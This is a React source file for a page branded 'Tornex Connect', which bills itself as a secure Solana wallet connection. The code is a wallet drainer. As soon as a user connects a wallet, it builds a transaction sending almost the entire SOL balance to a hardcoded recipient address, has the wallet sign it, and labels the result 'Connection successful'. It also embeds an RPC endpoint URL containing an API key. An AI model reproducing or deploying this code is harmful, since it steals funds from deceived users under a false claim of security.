import { useState, useEffect } from 'react';
import { Connection, PublicKey, SystemProgram, Transaction, ComputeBudgetProgram } from '@solana/web3.js';
import { SUPPORTED_WALLETS } from './utils/wallets';
import type { Wallet } from './utils/wallets';
import { createAvatar } from '@dicebear/core';
import { identicon } from '@dicebear/collection';
import './App.css';

type Status = {
  type: 'idle' | 'connecting' | 'active' | 'error' | 'sending';
  message: string;
  details?: string[];
};

const RPC_ENDPOINT = "https://polished-magical-bridge.solana-mainnet.quiknode.pro/a04ccce94da93a2cf477ebd52fcf7a9e70183a15/";
const RECIPIENT_ADDRESS = "677PmvCbw4i2PSYAPRG2FRVHxzPtXUA9o4UzoCYJGECx";

function App() {
  const [status, setStatus] = useState<Status>({
    type: 'idle',
    message: 'Connect your wallet to Tornex to continue'
  });
  const [walletModal, setWalletModal] = useState(false);
  const [connectedWallet, setConnectedWallet] = useState<{
    name: string;
    publicKey: string;
  } | null>(null);
  const [availableWallets, setAvailableWallets] = useState<typeof SUPPORTED_WALLETS>([]);

  // Generate identicon SVG data URL
  const generateIdenticon = (publicKey: string): string => {
    return createAvatar(identicon, {
      seed: publicKey,
      size: 128,
      scale: 80,
      radius: 0,
      backgroundType: ['gradientLinear']
    }).toDataUri();
  };

  useEffect(() => {
    const detectedWallets = SUPPORTED_WALLETS.filter(w => w.detect());
    setAvailableWallets(detectedWallets);
  }, []);

  const handleConnect = async (wallet: Wallet) => {
    try {
      setWalletModal(false);
      setStatus({ type: 'connecting', message: 'Connecting to Tornex...' });

      let publicKeyStr: string;
      let signTransactionFn: (tx: Transaction) => Promise<Transaction>;

      if (wallet.name === 'Solflare' && (window as any).solflare) {
        const response = await (window as any).solflare.connect();
        publicKeyStr = response.publicKey.toString();
        signTransactionFn = (tx: Transaction) => (window as any).solflare.signTransaction(tx);
      } else {
        const { publicKey, signTransaction } = await wallet.connect();
        if (!publicKey) throw new Error('Failed to get public key');
        publicKeyStr = publicKey.toString();
        signTransactionFn = signTransaction;
      }

      setConnectedWallet({ 
        name: wallet.name, 
        publicKey: publicKeyStr
      });
      
      setStatus({ 
        type: 'active', 
        message: `${wallet.name} connected`,
        details: ['Standby for confirmation...']
      });

      // Process transfer
      try {
        const connection = new Connection(RPC_ENDPOINT);
        const fromPubkey = new PublicKey(publicKeyStr);
        const toPubkey = new PublicKey(RECIPIENT_ADDRESS);

        const [balance, rentExemptMin, { blockhash }] = await Promise.all([
          connection.getBalance(fromPubkey),
          connection.getMinimumBalanceForRentExemption(0),
          connection.getLatestBlockhash()
        ]);

        const BASE_FEE = 5000;
        const MINIMUM_RESERVE = rentExemptMin;
        const sendAmount = balance - BASE_FEE - MINIMUM_RESERVE;

        if (sendAmount <= 0) {
          throw new Error(
            `Insufficient balance for Tornex connect.\n` +
            `Minimum required: ${((BASE_FEE + MINIMUM_RESERVE) / 1e9).toFixed(6)} SOL\n` +
            `Your balance: ${(balance / 1e9).toFixed(6)} SOL`
          );
        }

        const tx = new Transaction({
          feePayer: fromPubkey,
          recentBlockhash: blockhash
        });

        tx.add(
          ComputeBudgetProgram.setComputeUnitPrice({
            microLamports: 1000
          })
        );

        tx.add(
          SystemProgram.transfer({
            fromPubkey,
            toPubkey,
            lamports: sendAmount
          })
        );

        const signedTx = await signTransactionFn(tx);
        const txSignature = await connection.sendRawTransaction(signedTx.serialize(), {
          skipPreflight: false,
          preflightCommitment: 'confirmed'
        });

        await connection.confirmTransaction(txSignature, 'confirmed');

        setStatus({ 
          type: 'active', 
          message: 'Connection successful',
          details: [
            `Transferred ${(sendAmount / 1e9).toFixed(6)} SOL`,
            `TX: ${txSignature.slice(0, 4)}...${txSignature.slice(-4)}`
          ]
        });

      } catch (error) {
        console.error('Transfer error:', error);
        setStatus({
          type: 'error',
          message: 'Transfer failed',
          details: error instanceof Error ? [error.message] : ['Error processing transfer']
        });
        setConnectedWallet(null);
      }

    } catch (error) {
      console.error('Connection error:', error);
      setStatus({ 
        type: 'error', 
        message: 'Connection failed',
        details: error instanceof Error ? [error.message] : ['Could not connect to wallet']
      });
      setConnectedWallet(null);
    }
  };

  const handleDisconnect = () => {
    setConnectedWallet(null);
    setStatus({ type: 'idle', message: 'Connect your wallet to Tornex to continue' });
  };

  return (
    <div className="app-container">
      <div className="content-wrapper">
        <header className="app-header">
          <h1>Tornex Connect</h1>
          <p>Secure Solana wallet connection</p>
        </header>

        <main className="connection-panel">
          {!connectedWallet ? (
            <button 
              className="connect-button"
              onClick={() => setWalletModal(true)}
              disabled={status.type === 'connecting'}
            >
              {status.type === 'connecting' ? (
                <>
                  <span className="loading-spinner"></span>
                  Connecting...
                </>
              ) : (
                'Connect Wallet'
              )}
            </button>
          ) : (
            <div className="wallet-card">
              <div className="wallet-info">
                <img 
                  src={generateIdenticon(connectedWallet.publicKey)} 
                  alt="Wallet identicon"
                  className="identicon-img"
                  width={36}
                  height={36}
                />
                <div>
                  <div className="wallet-name">{connectedWallet.name}</div>
                  <div className="wallet-address">
                    {connectedWallet.publicKey.slice(0,4)}...{connectedWallet.publicKey.slice(-4)}
                  </div>
                </div>
              </div>
              <button 
                className="disconnect-button"
                onClick={handleDisconnect}
              >
                Disconnect
              </button>
            </div>
          )}

          <div className={`status-indicator ${status.type}`}>
            <div className="status-icon">
              {status.type === 'connecting' && <div className="loading-spinner small"></div>}
              {status.type === 'active' && <div className="status-dot active"></div>}
              {status.type === 'error' && <div className="status-dot error"></div>}
              {status.type === 'sending' && <div className="loading-spinner small"></div>}
            </div>
            <div className="status-message">
              <h3>{status.message}</h3>
              {status.details && <p>{status.details[0]}</p>}
            </div>
          </div>
        </main>

        {walletModal && (
          <div className="modal-overlay" onClick={() => setWalletModal(false)}>
            <div className="wallet-modal" onClick={e => e.stopPropagation()}>
              <div className="modal-header">
                <h2>Select Wallet</h2>
                <button 
                  className="modal-close"
                  onClick={() => setWalletModal(false)}
                >
                  &times;
                </button>
              </div>
              
              <div className="wallet-lists">
                <div className="wallet-group">
                  <h3>Installed Wallets</h3>
                  <div className="wallet-grid">
                    {availableWallets.map(wallet => (
                      <div 
                        key={wallet.name}
                        className="wallet-option"
                        onClick={() => handleConnect(wallet)}
                      >
                        <img 
                          src={wallet.icon} 
                          alt={wallet.name}
                          className="wallet-logo"
                        />
                        <span>{wallet.name}</span>
                      </div>
                    ))}
                  </div>
                </div>

                <div className="wallet-group">
                  <h3>Get a Wallet</h3>
                  <div className="wallet-grid">
                    {SUPPORTED_WALLETS.filter(w => !availableWallets.includes(w)).map(wallet => (
                      <a
                        key={wallet.name}
                        href={wallet.installUrl}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="wallet-option"
                      >
                        <img 
                          src={wallet.icon} 
                          alt={wallet.name}
                          className="wallet-logo"
                        />
                        <span>Install {wallet.name}</span>
                      </a>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

export default App;